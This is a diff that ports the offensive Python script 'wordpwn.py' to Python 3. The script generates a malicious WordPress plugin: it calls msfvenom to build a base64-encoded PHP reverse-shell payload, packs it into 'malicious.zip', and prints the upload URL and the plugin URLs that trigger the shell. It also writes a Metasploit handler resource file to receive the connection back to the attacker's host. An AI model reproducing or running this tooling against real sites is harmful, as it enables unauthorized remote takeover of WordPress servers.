@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 #
 # Script name     : wordpwn.py
 # Version         : 2.1
@@ -23,28 +23,28 @@ try:
 
 except IndexError:
 
-	print "__        __            _"
-	print "\ \      / /__  _ __ __| |_ ____      ___ __"
-	print " \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ "
-	print "  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |"
-	print "   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|"
-	print "                         |_|"
-	print '\n'
-	print "Usage: %s [LHOST] [LPORT] [HANDLER]" % sys.argv[0]
-	print "Example: %s 192.168.0.6 8888 Y" % sys.argv[0]
+	print("__        __            _")
+	print("\ \      / /__  ____ __| |___ __      __ ___")
+	print(" \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ ")
+	print("  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |")
+	print("   \_/\_/ \___/|_|  \__,	_| .__/ \_/\_/ |_| |_|")
+	print("                         |_|")
+	print('\n')
+	print("Usage: %s [LHOST] [LPORT] [HANDLER]" % sys.argv[0])
+	print("Example: %s 192.168.0.6 8888 Y" % sys.argv[0])
 	sys.exit()
 
 def generate_plugin(LHOST, LPORT, PAYLOAD):
 
 	# Check if msfvenom is installed
-	print "[*] Checking if msfvenom installed"
+	print("[*] Checking if msfvenom installed")
 	if "msfvenom" in os.listdir("/usr/bin/"):
-		print "[+] msfvenom installed"
+		print("[+] msfvenom installed")
 	else:
-		print "[-] msfvenom not installed"
+		print("[-] msfvenom not installed")
 		sys.exit()
 	# Our "Plugin" Contents
-	print "[+] Generating plugin script"
+	print("[+] Generating plugin script")
 	plugin_script = "<?php\n"
 	plugin_script += "/**\n"
 	plugin_script += " * Plugin Name: %s\n" % ('GotEm')
@@ -55,12 +55,12 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	plugin_script += " */\n"
 	plugin_script += "?>\n"
 	# Write Plugin Contents To File
-	print "[+] Writing plugin script to file"
+	print("[+] Writing plugin script to file")
 	plugin_file = open('QwertyRocks.php','w')
 	plugin_file.write(plugin_script)
 	plugin_file.close()
 	# Generate Payload
-	print "[+] Generating payload To file"
+	print("[+] Generating payload To file")
 	create_payload = subprocess.Popen(
 		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
 		'-e', 'php/base64', '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]
@@ -73,22 +73,22 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	payload_file.write(" ?>")
 	payload_file.close()
 	# Create Zip With Payload
-	print "[+] Writing files to zip"
+	print("[+] Writing files to zip")
 	make_zip = zipfile.ZipFile('malicious.zip', 'w')
 	make_zip.write('wetw0rk_maybe.php')
 	make_zip.write('QwertyRocks.php')
-	print "[+] Cleaning up files"
+	print("[+] Cleaning up files")
 	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
 	# Useful Info
-	print "[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload"
-	print "[+] How to trigger the reverse shell : "
-	print "      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php"
-	print "      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php"
+	print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
+	print("[+] How to trigger the reverse shell : ")
+	print("      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php")
+	print("      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php")
 
 
 def handler(LHOST, LPORT, PAYLOAD):
 	# Write MSF ressource file
-	print "[+] Launching handler"
+	print("[+] Launching handler")
 	handler = "use exploit/multi/handler\n"
 	handler += "set PAYLOAD %s\n" % PAYLOAD
 	handler += "set LHOST %s\n" % LHOST.lstrip('LHOST=')
